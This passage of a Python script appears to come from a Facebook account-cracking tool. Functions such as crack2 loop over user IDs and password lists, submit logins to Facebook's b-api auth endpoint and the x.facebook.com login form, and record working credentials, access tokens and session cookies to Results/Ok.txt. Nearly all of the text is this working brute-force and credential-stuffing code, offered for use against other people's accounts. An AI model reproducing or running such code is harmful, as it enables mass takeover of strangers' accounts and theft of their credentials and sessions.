            send = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers_)
            if 'session_key' in send.text and 'EAAA' in send.text:
                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, send.json()['access_token']))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
            elif 'www.facebook.com' in send.json()['error_msg']:
                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                cp.append("%s|%s"%(uid, pw))
                open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                break
            else:
                continue
        loop +=1
    except:
        pass
# Crack X.Facebook.com
def crack2(ids, uid, pwx, **kwargs):
    global loop, uas, ok, cp
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"origin": "https://x.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "x.facebook.com", "referer": "https://x.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
            p = ses.get("https://x.facebook.com/login/?next&ref=dbl&refid=8").text
            b = parser(p,"html.parser")
            bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
            for i in b('input'):
                try:
                    if i.get('name') in bl:
                        kwargs.update({i.get('name'): i.get('value')})
                    else:continue
                except:pass
            kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
            gaaa = ses.post("https://x.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fx.facebook.com%2F&lwv=100&refid=8",data=kwargs)
            if "c_user" in ses.cookies.get_dict().keys():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                cp.append("%s|%s"%(uid, pw))
                open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                break
            else:
                continue
        loop +=1
    except:
        pass

if __name__=='__main__':
	os.system("git pull")
	___menu___()
